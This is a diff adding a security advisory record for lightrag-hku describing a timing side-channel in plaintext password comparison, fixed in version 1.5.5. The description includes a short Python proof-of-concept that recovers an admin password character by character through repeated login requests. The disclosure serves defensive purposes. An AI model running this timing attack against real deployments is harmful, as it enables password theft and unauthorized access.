@@ -1,0 +1,62 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-09-22T20:40:20Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "lightrag-hku"
+  },
+  "Advisory": {
+    "DatabaseId": 500929,
+    "Id": "GSA_kwCzR0hTQS1jNzU5LWN4OXAtbXJ3cc4AB6TB",
+    "GhsaId": "GHSA-c759-cx9p-mrwq",
+    "References": [
+      {
+        "Url": "https://github.com/HKUDS/LightRAG/security/advisories/GHSA-c759-cx9p-mrwq"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85725"
+      },
+      {
+        "Url": "https://github.com/HKUDS/LightRAG/pull/3423"
+      },
+      {
+        "Url": "https://github.com/HKUDS/LightRAG/commit/89849c3ed0e0380345a6b5bade027cfb9a5bf32c"
+      },
+      {
+        "Url": "https://github.com/HKUDS/LightRAG/releases/tag/v1.5.5"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-c759-cx9p-mrwq"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-c759-cx9p-mrwq"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-85725"
+      }
+    ],
+    "Description": "### Summary\nWhen plaintext passwords are stored in AUTH_ACCOUNTS, the comparison uses Python's == operator which is not constant-time. An attacker with low-latency access can exploit timing differences to recover the password character by character.\n\n### Details\n\n```python\n# lightrag/api/passwords.py:13-26\ndef verify_password(plain_password: str, stored_password: str) -\u003e bool:\n    if stored_password.startswith(\"{bcrypt}\"):\n        ...\n        return bcrypt.checkpw(...)    # constant-time  OK\n\n    return stored_password == plain_password  # NOT constant-time  VULN\n    #   Python == short-circuits on first mismatched byte\n    #   Timing leaks: password length + individual characters\n```\n\n### PoC\n\n```python\n# Timing oracle: recover password char-by-char\nimport httpx, time, string\n\nTARGET = \"http://\u003cTARGET\u003e:9621/login\"\nUSER   = \"admin\"\n\ndef measure(pwd: str) -\u003e float:\n    t = time.perf_counter()\n    httpx.post(TARGET, data={\"username\": USER, \"password\": pwd})\n    return time.perf_counter() - t\n\nknown = \"\"\nfor _ in range(32):\n    best = max(string.printable,\n               key=lambda c: sum(measure(known+c+\"A\"*20) for _ in range(10)))\n    known += best\n    print(f\"Recovered: {known}\")\n```\n\n### Impact\nObservable timing discrepancy. Attackers with low-latency access can recover plaintext passwords character by character without triggering brute-force limits. Only affects deployments using unhashed passwords in AUTH_ACCOUNTS.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-09-22T20:40:19Z",
+    "Severity": "MODERATE",
+    "Summary": "lightrag-hku: Plaintext Passwords Compared Without Constant-Time Function",
+    "UpdatedAt": "2026-09-22T20:40:20Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.9,
+      "VectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.5.5"
+      },
+      "VulnerableVersionRange": "\u003c= 1.5.4"
+    }
+  ]
+}
